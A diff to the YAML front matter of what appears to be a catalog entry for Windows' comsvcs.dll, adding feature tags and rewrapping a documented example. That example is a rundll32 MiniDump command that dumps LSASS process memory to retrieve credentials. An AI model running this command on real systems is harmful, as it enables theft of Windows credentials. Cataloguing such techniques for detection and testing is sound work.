@@ -41,7 +41,9 @@ resource_profile:
 allowed-tools:
 - comsvcs
 parameters: []
-features: []
+features:
+- pipes-stdout
+- process-manip
 execution:
   template: comsvcs
   sandbox: execFile
@@ -49,8 +51,10 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump. (Dump Lsass.exe process memory to retrieve credentials.)
-  command: rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
+- description: Calls the MiniDump exported function of comsvcs.dll, which in turns
+    calls MiniDumpWriteDump. (Dump Lsass.exe process memory to retrieve credentials.)
+  command: rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin
+    full
 references:
 - label: ''
   url: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
@@ -73,7 +77,6 @@ install:
   commands:
   - choco install comsvcs
 ---
-
 
 # comsvcs
 
